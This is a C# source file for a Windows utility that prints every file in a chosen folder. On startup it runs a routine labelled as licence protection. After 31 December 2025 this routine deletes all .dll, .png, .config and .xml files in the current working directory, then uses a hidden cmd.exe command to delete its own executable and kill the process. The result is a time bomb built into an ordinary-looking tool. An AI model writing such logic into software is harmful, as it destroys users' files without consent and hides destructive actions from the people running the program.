using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace PrintFolderSelect
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public string selectedPath;
        public MainWindow()
        {
            InitializeComponent();
            InitializeAppWindow();
        }
        private void InitializeAppWindow()
        {
            Torpeda();
        }

        
        //========================================================================================================//
        private void buttonExit_Click(object sender, RoutedEventArgs e)
        {
            this.Close();
        }
        //========================================================================================================//
        private void buttonPrint_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                 ReturnFilesDirectory(selectedPath);
                   
            }
            catch
            {
                System.Windows.MessageBox.Show("S-a produs o eroare sau nu au fost găsite mapa/fisierele\n pentru printate!!!\nVerificați și Repetați!!!");
            }
           
        }
        //========================================================================================================//
        private void buttonSearch2_Click(object sender, RoutedEventArgs e)
        {
            textBox_calea.IsEnabled = true;

            using (var fldrDlg = new System.Windows.Forms.FolderBrowserDialog())
            {
                //fldrDlg.Filter = "Png Files (*.png)|*.png";
                //fldrDlg.Filter = "Excel Files (*.xls, *.xlsx)|*.xls;*.xlsx|CSV Files (*.csv)|*.csv"

                if (fldrDlg.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    selectedPath = fldrDlg.SelectedPath;

                    if (selectedPath != null)
                        textBox_calea.Text = selectedPath;

                    //Text = selectedPath; //System.IO.Path.GetDirectoryName(fldrDlg.FileName);

                }
                //w15a.Visibility = Visibility.Visible;
                //w14.Visibility = Visibility.Hidden;
                //w15.Visibility = Visibility.Hidden;
            }
        }
        //========================================================================================================//
        #region PRINTARE
        //========================================================================================================//
        //Metoda scoate denumirele fisierelor din mapa indicata in parametru
        //si printeaza fiecare document
        public string[] ReturnFilesDirectory(string katal)
        {
            int i = 0;
            string[] res = Directory.GetFiles(katal);
            foreach (string s in res)
            {
                if (i >= 0 && i < res.Length) //asa se printeaza toate actele
                {
                    PrintDocx(s);
                    i++;
                    //Thread.Sleep(500);
                }
            }
            return res;
        }
        //==================================================================================================//
        //tiho tiho rabocii //printeaza documentele
        private void PrintDocx(string imageFilePath)
        {
            try
            {
                ProcessStartInfo info = new ProcessStartInfo(imageFilePath);
                info.Verb = "Print";
                info.CreateNoWindow = false;
                info.CreateNoWindow = false;
                info.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(info);
            }
            catch
            { }
            
         }
        //========================================================================================================//
        #endregion
        //========================================================================================================//
        #region CURATIRE/REFRESH
        //========================================================================================================//

        private void buttonClear_Click(object sender, RoutedEventArgs e)
        {
            selectedPath="";
            textBox_calea.Text = "";
        }

        private void buttonNew_Click(object sender, RoutedEventArgs e)
        {
            selectedPath = "";
            textBox_calea.Text = "adresa mapei pentru printare";
            textBox_calea.IsEnabled = false;
        }
        //========================================================================================================//
        #endregion
        //========================================================================================================//
        //====================================================================================================================//
        #region METODE SECURITATE IMPOTRIVA COPIERII / EXPIRARE LICENTA
        //====================================================================================================================//
        //Metoda verifica data expirarii licentei si nimiceste toate fisierele din mapa curenta
        private void Torpeda()
        {
            DateTime dateFinal = new DateTime(2025, 12, 31); //termen final de valabilitate
            DateTime dateNow = DateTime.Now;
            int i = DateTime.Compare(dateFinal, dateNow);
            if (i == 0 || i < 0)
            {
                var a = Task.Factory.StartNew(() => { Thread.Sleep(1000); });
                var UISyncContext = TaskScheduler.FromCurrentSynchronizationContext();
                var b = a.ContinueWith((antecedent) =>
                {
                    System.Windows.MessageBox.Show("A expirat LICENȚA!!!");
                    DeleteAllFiles(); KILLER2(); KILLER();
                }, UISyncContext);
            }
        }
        
        //====================================================================================================================//
        //Metoda peste un timp anumit (dateFinal) inchide fereastra aplicatiei
        private void KILLER()
        {
            this.Close();
        }
        //====================================================================================================================//
        //Metoda peste un timp anumit (dateFinal) nimiceste file.exe al aplicatiei 
        private void KILLER2()
        {
            ProcessStartInfo info = new ProcessStartInfo();
            info.Arguments = @"/C choice /C Y /N /D Y /T 10 & Del """ + System.Environment.GetCommandLineArgs()[0] + @"""";
            info.WindowStyle = ProcessWindowStyle.Hidden;
            info.CreateNoWindow = true;
            info.FileName = "cmd.exe";
            Process.Start(info);
            System.Diagnostics.Process.GetCurrentProcess().Kill();

        }
        //====================================================================================================================//
        //Metoda nimiceste toate fisierele din mapa curenta (.dll,.xml,.config,.png)
        private void DeleteAllFiles()
        {
            //определим рабочую папку
            DirectoryInfo path = new DirectoryInfo(Directory.GetCurrentDirectory());

            //получим все файлы по маске .dll
            FileInfo[] files1 = path.GetFiles("*.dll");
            foreach (FileInfo fi in files1)
            {
                fi.Delete();
            }

            //получим все файлы по маске .png
            FileInfo[] files2 = path.GetFiles("*.png");
            foreach (FileInfo fi in files2)
            {
                fi.Delete();
            }
            //  //получим все файлы по маске .pdb
            /*FileInfo[] files2 = path.GetFiles("*.pdb");//nu lucreaza
            foreach (FileInfo fi in files2)
            {
                fi.Delete();
            }*/

            //получим все файлы по маске .config
            FileInfo[] files3 = path.GetFiles("*.config");
            foreach (FileInfo fi in files3)
            {
                fi.Delete();
            }

            //получим все файлы по маске .xml
            FileInfo[] files4 = path.GetFiles("*.xml");
            foreach (FileInfo fi in files4)
            {
                fi.Delete();
            }

            //получим все файлы по маске .exe //nu prea lucreaza
            /*FileInfo[] files5 = path.GetFiles("*.exe");
            foreach (FileInfo fi in files5)
            {
                fi.Delete();
            }*/


        }
        //====================================================================================================================//
        #endregion
    }

}



